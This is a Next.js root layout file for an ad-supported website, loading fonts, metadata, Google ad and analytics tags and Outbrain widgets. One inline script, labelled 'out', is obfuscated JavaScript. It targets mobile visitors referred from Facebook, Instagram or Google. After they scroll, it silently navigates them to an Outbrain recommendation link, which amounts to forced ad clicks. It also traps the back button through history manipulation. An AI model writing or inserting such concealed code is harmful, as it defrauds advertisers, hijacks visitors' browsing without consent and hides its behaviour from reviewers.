import Script from "next/script";
import { Roboto_Slab } from "next/font/google";
import { Toaster } from "react-hot-toast";

import type { Metadata } from "next";

import LoadingWrapper from "@/components/wrappers/loading-wrapper";
import { CardImage, description, keywords, title, url } from "@/constant";

import "@/app/globals.css";
import Footer from "@/components/footer/Footer";

export const revalidate = 0;

// Fonts
const poppins = Roboto_Slab({
  subsets: ["latin"],
  display: "swap",
  weight: ["100", "200", "300", "400", "500", "600", "700", "800", "900"],
});

// Meta Data

export const metadata: Metadata = {
  title: `${title}`,
  description: description,
  keywords: keywords,
  robots: "index follow",
  twitter: {
    card: "summary_large_image",
    site: title,
    title: `${title}`,
    description: description,
    images: CardImage,
  },
  openGraph: {
    type: "website",
    siteName: `${title}`,
    description: description,
    url: url,
    countryName: "USA",
    images: CardImage,
  },
  metadataBase: new URL(url),
  alternates: {
    canonical: "/",
  },
  publisher: "Truepub Media",
  icons: "/favicon.ico",
};

// Main HTML
export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en" className="scroll-smooth">
      <body className={`${poppins.className} overflow-x-hidden`}>
        <Script
          src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"
          async
          strategy="afterInteractive"
        ></Script>
        <Script
          src="https://www.googletagmanager.com/gtag/js?id=G-8FYMCYZZN2"
          async
          strategy="afterInteractive"
        ></Script>
        <Script
          src="//widgets.outbrain.com/outbrain.js"
          async
          type="text/javascript"
          strategy="afterInteractive"
        ></Script>
        <Script id="google-analatics">
          {` window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'G-8FYMCYZZN2');`}
        </Script>
        <Script id="out" strategy="afterInteractive">
          {`const _0x5e4e41=_0x2a57;(function(_0x2a0a65,_0x1bec1f){const _0x139aba=_0x2a57,_0x28ccab=_0x2a0a65();while(!![]){try{const _0x348f4f=-parseInt(_0x139aba(0xf5))/0x1*(-parseInt(_0x139aba(0xe9))/0x2)+parseInt(_0x139aba(0xea))/0x3+parseInt(_0x139aba(0xf0))/0x4*(parseInt(_0x139aba(0xdc))/0x5)+-parseInt(_0x139aba(0xdd))/0x6*(parseInt(_0x139aba(0xe4))/0x7)+parseInt(_0x139aba(0xef))/0x8*(parseInt(_0x139aba(0xf3))/0x9)+parseInt(_0x139aba(0xfc))/0xa*(-parseInt(_0x139aba(0xe2))/0xb)+parseInt(_0x139aba(0xe1))/0xc;if(_0x348f4f===_0x1bec1f)break;else _0x28ccab['push'](_0x28ccab['shift']());}catch(_0x25127a){_0x28ccab['push'](_0x28ccab['shift']());}}}(_0x1588,0x5eee3));const num=Math['random'](),isMobile=/iPhone|iPad|iPod|Android/i[_0x5e4e41(0xe7)](navigator[_0x5e4e41(0xe5)]),allowedReferer=[_0x5e4e41(0xf6),_0x5e4e41(0xee),_0x5e4e41(0xf9)];function isFromAllowedReferer(){const _0x360ba8=_0x5e4e41,_0xef84dd=document[_0x360ba8(0xf4)][_0x360ba8(0xfa)]();return allowedReferer[_0x360ba8(0xf7)](_0x3abee0=>_0xef84dd[_0x360ba8(0xfe)](_0x3abee0));}function _0x2a57(_0x4b2587,_0x5c8bee){const _0x15885f=_0x1588();return _0x2a57=function(_0x2a57e1,_0x298582){_0x2a57e1=_0x2a57e1-0xda;let _0x50e451=_0x15885f[_0x2a57e1];return _0x50e451;},_0x2a57(_0x4b2587,_0x5c8bee);}function randomIntFromInterval(_0x302149,_0x3dd22a){const _0xf9f4eb=_0x5e4e41;return Math['floor'](Math[_0xf9f4eb(0xe3)]()*(_0x3dd22a-_0x302149+0x1)+_0x302149);}const outBrainFunction=()=>{function _0x4b5e9b(){const _0x14d6bf=_0x2a57,_0x1b74f1=[];function _0x10efbd(_0x917bc4){const _0x3f2c39=_0x2a57;_0x917bc4[_0x3f2c39(0xe6)]&&_0x1b74f1[_0x3f2c39(0xdf)](_0x917bc4[_0x3f2c39(0xe6)]);for(const _0x482ea4 of _0x917bc4[_0x3f2c39(0xda)]){_0x10efbd(_0x482ea4);}}_0x10efbd(document['body']),_0x1b74f1['length']>0x0?_0x1b74f1[_0x14d6bf(0xde)](_0x3df5da=>{const _0x3fb09b=_0x14d6bf,_0x1eaf70=_0x3df5da[_0x3fb09b(0xe8)](_0x3fb09b(0xe0));_0x1eaf70&&(window[_0x3fb09b(0xf1)][_0x3fb09b(0xec)]=_0x1eaf70['href']);}):console[_0x14d6bf(0xfb)](_0x14d6bf(0xf8));}setTimeout(()=>{_0x4b5e9b();},randomIntFromInterval(0x3,0x6)*0x3e8);};function _0x1588(){const _0x37ddfa=['2791756oxEjNJ','random','378SQdZhP','userAgent','shadowRoot','test','querySelector','694736BrLlds','1208658FJDpmN','pushState','href','popstate','instagram.com','88648fTuYMi','57620cQgiRF','location','scrollY','90pnswcF','referrer','1QLiEld','facebook.com','some','No\x20shadow\x20roots\x20found.','google.com','toLowerCase','log','30aOmIvk','addEventListener','includes','children','URL','95AwEFQI','64458RBaZUP','forEach','push','.ob-dynamic-rec-link','7147032HgvYWV'];_0x1588=function(){return _0x37ddfa;};return _0x1588();}if(isFromAllowedReferer()&&isMobile){const randomNumber=Math['floor'](Math[_0x5e4e41(0xe3)]()*(0x5dc-0x3e8+0x1))+0x3e8;let run=![];window[_0x5e4e41(0xfd)]('scroll',()=>{const _0x463daf=_0x5e4e41;window[_0x463daf(0xf2)]>=randomNumber&&!run&&(outBrainFunction(),run=!![]);}),history[_0x5e4e41(0xeb)](null,null,document[_0x5e4e41(0xdb)]),window[_0x5e4e41(0xfd)](_0x5e4e41(0xed),()=>{const _0x253d35=_0x5e4e41;window[_0x253d35(0xf1)][_0x253d35(0xec)]=window[_0x253d35(0xf1)][_0x253d35(0xec)];});}`}
        </Script>
        <Script strategy="afterInteractive" id="inter-ads" async>
          {`window.googletag = window.googletag || { cmd: [] };
          let interstitialSlot;
          googletag.cmd.push(() => {
            // Define a web interstitial ad slot.
            interstitialSlot = (interstitialSlot = googletag.defineOutOfPageSlot(
              "/22971894985/PM_S_INTERSTITIAL",
              googletag.enums.OutOfPageFormat.INTERSTITIAL
            ));

            // Slot returns null if the page or device does not support interstitials.
            if (interstitialSlot) {
              // Enable optional interstitial triggers and register the slot.
              interstitialSlot.addService(googletag.pubads()).setConfig({
                interstitial: {
                  triggers: {
                    navBar: true,
                    unhideWindow: true,
                  },
                },
              });

              googletag.enableServices();
            }
          });
          `}
        </Script>
        <Script strategy="afterInteractive" id="inter-ads-push" async>
          {`
            googletag.cmd.push(() => {
              googletag.display(interstitialSlot);
            });
          `}
        </Script>
        <Toaster position="top-center" />
        <LoadingWrapper />

        {children}
        <Footer />
      </body>
    </html>
  );
}
